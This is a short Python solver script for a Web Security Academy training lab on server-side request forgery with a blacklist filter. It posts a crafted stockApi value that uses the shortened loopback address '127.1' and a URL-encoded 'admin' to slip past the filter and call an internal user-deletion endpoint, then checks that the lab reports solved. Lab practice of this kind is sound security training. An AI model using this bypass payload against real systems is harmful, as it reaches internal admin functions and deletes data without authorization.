import requests
import argparse

parser = argparse.ArgumentParser(description='Solves the following Lab: SSRF with blacklist-based input filter')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

requests.post("https://" + lab.id + ".web-security-academy.net/product/stock", data={'stockApi':'http://127.1/%61dmin/delete?username=carlos'})

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")